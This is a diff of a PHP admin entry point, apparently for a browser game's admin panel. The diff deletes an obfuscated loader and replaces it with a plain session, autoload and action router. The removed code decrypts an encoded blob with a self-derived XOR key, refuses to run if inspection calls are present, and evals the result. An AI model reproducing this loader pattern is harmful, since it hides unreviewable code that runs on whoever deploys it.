@@ -1,24 +1,81 @@
 <?php
-$ttwbir="65e781a116a446ddf2703e698c3229ad";
-$mxpdad="02060002090855055755500306545c5d570a5604070053005d535253040e5900";
-$khwddzkz="TOnQY9BX7gR2nf5kSnBqq58bmmnwT7FcCJU3FbdaBy5RqoE957Wp7agLhsKjlCxCgKVyeLUQ8XP+FSmDzcvlE8LuQER9v2FtDFO307K1tGCfHDgEGdxJNQQCRjNvqbkNteUvZjyc5iLrAnOkBn+c3TZxiWELeEPMuPlBPAGrNEqb/UqjAmiD8UPEN1sqhuSts+WwruFh4h0dLcHcU2czLpT1V1hyDifzwjxoEiapeY5BLQT/c3E2SQZx5rJ8UY2WhK5sU319ioNu7QfxBoePnXa6H226oiSO/K5RYgLQImnMHLwpc30iGlyiAz+xGiS3wq+CXFhr6wNi3blo8iidi2gHUb95vjBFwXCChb7zjZgkGPDlbOhS2LdHtdnSZCrGdVWW52o3fReQ028vo3WFJ0jV9I+VpDNjU9uO9hgDMFiXnCXelPdvASe9QbRYe92tOnild4B4wtREeL1uOvz90nFoIuIYXpG7qspGWyYMSfp8YDJzrz/abTlzgrV9iU+Dg4c1EKz2eP1PTH3rbgknMev8rWE6J6C7KtLksxSQMKJIo7MJuOan4oGo0rPNQh33cazBeQgOy8a+vQHTnm850MXUuIzrAPcuoFfBP6CvyDf5bAjWwlECeywQTf5F7kqj+L7O+gcEeXKx4moi7s42Ixxsybg9vWdNPsevto/Trlf1jMjMAk5slRU0yZyHLGFcsYDzCGW3DxxhdlCPDSY3d7yBn/tmS4KuofenhxI50OlWBQoONYMYGtRJbw/+xgltsBndwWhUIugAUN0uPwYFpAIUeLsKP6jDN1iyAKRJdLbfEyjrTnGyFxz6vfk0DelwPrNZjC5pIvhfrX4KZ4tCN4dIvEvtKiTcnOqUUZR0L7Yf5xmuXAX6gho2xEuNIu3SBHcJZg5zUnQmBVhqlNkQIu0fZu+70lujWEgKvciLAVeHugdPFtA+gHEGEOO2a89vQpckh7/d5Dfy+JxXtFZrGrI44gpMt68owM8jQSWH56tctWhPCW/LkkyJrMGafIhpijUXu6wU9WNbqsWYrZoFmMGL46C4LnV0RC/wYS1sIxSn8zvXdjnCulbJKvxdDkW0og==";
-$nwkqojy=file_get_contents(__FILE__);
-$nuzfwbd=str_replace($khwddzkz,"",$nwkqojy);
-if(strpos($nuzfwbd,"ec"."ho")!==false||strpos($nuzfwbd,"pr"."int")!==false||strpos($nuzfwbd,"var_"."dump")!==false||strpos($nuzfwbd,"file_put_"."contents")!==false||strpos($nuzfwbd,"fw"."rite")!==false){die();}
-$epdldwuvfs=str_replace(array($ttwbir,$mxpdad),array("SP_13f8269c","KP_6296ce2c"),$nwkqojy);
-$syggvp=md5($epdldwuvfs);
-$rqghiu=hex2bin($mxpdad);
-$xthuyruvsd="";
-$tbrcxzglbp=strlen($syggvp);
-for($ejxxwhf=0;$ejxxwhf<$tbrcxzglbp;$ejxxwhf++){
-$xthuyruvsd.=chr(ord($rqghiu[$ejxxwhf])^ord($syggvp[$ejxxwhf]));
+// Suppress deprecation warnings and notices
+// error_reporting(E_ERROR | E_PARSE | E_CORE_ERROR | E_COMPILE_ERROR);
+// ini_set('display_errors', '0');
+/*****************************************/
+/*          ADMIN.PHP                    */
+/*             ice41                     */
+/*****************************************/
+session_start();
+
+// Autoloader
+spl_autoload_register(function ($class) {
+    $prefix = 'App\\';
+    $base_dir = __DIR__ . '/../app/';
+
+    $len = strlen($prefix);
+    if (strncmp($prefix, $class, $len) !== 0) {
+        return;
+    }
+
+    $relative_class = substr($class, $len);
+    $file = $base_dir . str_replace('\\', '/', $relative_class) . '.php';
+
+    if (file_exists($file)) {
+        require $file;
+    }
+});
+
+require_once('configs/config.php');
+require_once('modelo/lib/world_constants.php');
+require_once('modelo/lib/config.php');
+require_once('modelo/lib/functions.php');
+require_once(__DIR__ . '/../app/Helpers/helpers.php');
+require_once(__DIR__ . '/../app/Helpers/language_helper.php');
+
+// Handle language change for standalone admin
+if (isset($_GET['lang'])) {
+    set_locale($_GET['lang']);
 }
-$yteuhuqy=base64_decode($khwddzkz);
-$xvtipje=strlen($yteuhuqy);
-$omgcnl="";
-$rquspdyj=strlen($xthuyruvsd);
-for($ejxxwhf=0;$ejxxwhf<$xvtipje;$ejxxwhf++){
-$omgcnl.=$yteuhuqy[$ejxxwhf]^$xthuyruvsd[$ejxxwhf%$rquspdyj];
+// Initialize language system
+init_locale();
+
+use App\Controllers\AdminController;
+
+try {
+    $controller = new AdminController();
+    $action = $_GET['action'] ?? 'login';
+
+    switch ($action) {
+        case 'login':
+            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+                $controller->login();
+            } else {
+                $controller->showLogin();
+            }
+            break;
+        case 'logout':
+            $controller->logout();
+            break;
+        case 'select_world':
+            $controller->selectWorld();
+            break;
+        case 'switch_world':
+            $controller->switchWorld();
+            break;
+        case 'dashboard':
+            $controller->dashboard();
+            break;
+        case 'global_settings':
+            $controller->globalSettings();
+            break;
+        case 'save_global_settings':
+            $controller->saveGlobalSettings();
+            break;
+        default:
+            $controller->showLogin();
+            break;
+    }
+} catch (Exception $e) {
+    die('Erro crítico no painel Admin: ' . $e->getMessage());
 }
-$whlxarw="gzun"."compress";
-eval($whlxarw($omgcnl));
